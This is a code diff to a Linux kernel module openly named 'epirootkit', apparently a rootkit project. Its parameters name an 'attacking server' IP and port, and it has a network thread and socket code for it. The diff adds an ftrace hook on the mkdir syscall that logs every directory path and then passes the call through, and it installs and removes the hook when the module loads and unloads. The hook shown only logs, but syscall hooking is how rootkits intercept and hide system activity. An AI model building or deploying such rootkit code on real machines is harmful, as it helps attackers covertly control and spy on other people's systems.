@@ -2,8 +2,10 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/kthread.h>
+#include <linux/uaccess.h>
 
 #include "epirootkit.h"
+#include "ftrace_helper.h"
 
 struct task_struct *network_thread = NULL;
 bool thread_exited = false;
@@ -20,6 +22,34 @@ MODULE_PARM_DESC(ip, "IPv4 of attacking server");
 MODULE_PARM_DESC(port, "Port of attacking server");
 MODULE_PARM_DESC(message, "Message to send to the attacking server");
 
+// Global variable to store the original mkdir syscall address.
+unsigned long __orig_mkdir = 0;
+
+/**
+ * @brief Hook function for the mkdir syscall.
+ *
+ * @param pathname User-space pointer to the directory path.
+ * @param mode Permissions mode for the new directory.
+ * @return Return value from the original mkdir syscall.
+ */
+asmlinkage int my_mkdir_hook(const char __user *pathname, int mode)
+{
+    char kpath[256];
+    int copied, ret;
+
+    copied = strncpy_from_user(kpath, pathname, sizeof(kpath));
+    if (copied > 0) printk(KERN_INFO "my_mkdir_hook: mkdir called with path: %s, mode: %o\n", kpath, mode);
+    else printk(KERN_INFO "my_mkdir_hook: mkdir called (failed to copy pathname)\n");
+
+    ret = ((int (*)(const char __user *, int))__orig_mkdir)(pathname, mode);
+    return ret;
+}
+
+// Array of hooks to install.
+static struct ftrace_hook hooks[] = { 
+	HOOK("sys_mkdir", my_mkdir_hook, &__orig_mkdir) 
+};
+
 /**
  * @brief Initializes the epirootkit module.
  *
@@ -29,6 +59,15 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
 static int __init epirootkit_init(void)
 {
 	pr_info("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
+
+	// Initalize hooks for the syscall table
+	int err;
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if (err)
+    {
+        printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
+        return err;
+    }
 
 	// Init structure for exec_code_stds
 	// code: return code of the command
@@ -68,6 +107,9 @@ static void __exit epirootkit_exit(void)
 	}
 
 	close_socket();
+
+	// Remove hooks from the syscall table
+	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 
 	pr_info("epirootkit: epirootkit_exit: module unloaded\n");
 }
